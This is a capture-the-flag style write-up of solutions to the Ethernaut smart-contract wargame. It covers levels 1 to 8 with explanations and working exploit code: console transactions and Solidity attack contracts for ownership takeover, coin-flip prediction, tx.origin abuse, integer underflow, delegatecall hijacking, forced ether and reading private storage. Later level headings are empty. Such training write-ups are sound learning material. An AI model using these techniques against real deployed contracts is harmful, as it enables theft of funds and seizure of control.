# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between contract functions and fallback function.
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.

Note: For some reason, I can't seem to call these functions more than once in the same function call i.e. another function that calls one of these malicious functions multiple times in one function call.
``` 
pragma solidity ^0.6.0;
import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint;
    
    address public targetContract;
    
    constructor(address _targetContract) public {
        targetContract = _targetContract;
    }
    
    function attackFlipWithContract() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(targetContract).flip(side);
    }
    
    function attackFlipWithout() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
        (bool success, ) = targetContract.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 4. Telephone
When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin.
```
pragma solidity ^0.6.0;
contract AttackTelephone {
    address public telephone;
    
    constructor(address _telephone) public {
        telephone = _telephone;
    }
    
    function changeBadOwner(address badOwner) public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
        (bool success, ) = telephone.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 5. Token
No integer over/underflow protection. Always use [safemath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) libraries. As long as you pass a value > 20, the condition in the first require statement will underflow and it will always pass. 
```
await contract.transfer(instance, 25)
```

## 6. Delegation
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await contract.sendTransaction({
    data: payload
});
```

## 7. Force
You can easily forcibly send ether to a contract. Read [this](https://consensys.github.io/smart-contract-best-practices/known_attacks/#forcibly-sending-ether-to-a-contract) to learn more.
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}
```

## 8. Vault
EVM storage is 2^256 slots of 32 bytes, values are stored sequentially from the right. see Nicole Zhu
```
Solution:
let pw = await web3.eth.getStorageAt(instance, 0);
await contract.unlock(pw);
```
## 9. King

## 10. Re-entrancy

## 11. Elevator


## 12. Privacy


## 13. Gatekeeper One

## 14. Gatekeeper Two

## 15. Naught Coin


## 16. Preservation

## 17. Recovery

## 18. MagicNumber

## 19. AlienCodex

## 20. Denial


## 21. Shop

